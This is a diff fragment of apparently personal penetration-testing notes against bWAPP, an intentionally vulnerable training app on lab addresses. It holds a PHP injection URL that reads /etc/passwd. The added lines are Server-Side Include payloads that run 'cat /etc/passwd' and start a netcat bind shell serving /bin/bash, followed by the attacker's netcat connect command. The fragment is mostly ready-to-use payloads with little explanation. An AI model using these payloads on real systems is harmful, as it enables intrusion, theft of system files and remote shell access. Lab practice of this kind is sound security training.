@@ -49,3 +49,22 @@ nc -lvp 775
 ```
 192.168.200.130/bWAPP/phpi.php?message=a;echo "what"; $fp = fopen("/etc/passwd","r");$result = fread($fp,8192); echo $result
 ```
+
+### Server-Side Includes:
+
+```
+<!--#echo var="DATE_LOCAL" -->
+<!--#exec cmd="cat /etc/passwd" -->
+<!--#exec cmd="nc -lvp 775 -e /bin/bash" -->
+Attacker's machine:
+```
+nc -nv 192.168.200.150 775
+
+```
+
+
+
+
+
+
+
